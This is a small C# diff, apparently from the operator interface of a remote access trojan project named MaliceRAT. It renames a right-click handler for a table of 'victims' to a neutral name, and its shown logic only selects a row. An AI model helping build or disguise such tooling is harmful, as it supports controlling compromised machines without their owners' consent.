@@ -16,15 +16,15 @@ namespace MaliceRAT
 
             return menuItem;
         }
-        public static void GunaVictimsTable_MouseDown(object sender, MouseEventArgs e, DataGridView gunaVictimsTable)
+        public static void GunaTable_MouseDown(object sender, MouseEventArgs e, DataGridView gunaTable)
         {
             if (e.Button == MouseButtons.Right)
             {
-                var hti = gunaVictimsTable.HitTest(e.X, e.Y);
-                gunaVictimsTable.ClearSelection();
+                var hti = gunaTable.HitTest(e.X, e.Y);
+                gunaTable.ClearSelection();
                 if (hti.RowIndex != -1)
                 {
-                    gunaVictimsTable.Rows[hti.RowIndex].Selected = true;
+                    gunaTable.Rows[hti.RowIndex].Selected = true;
                 }
             }
         }
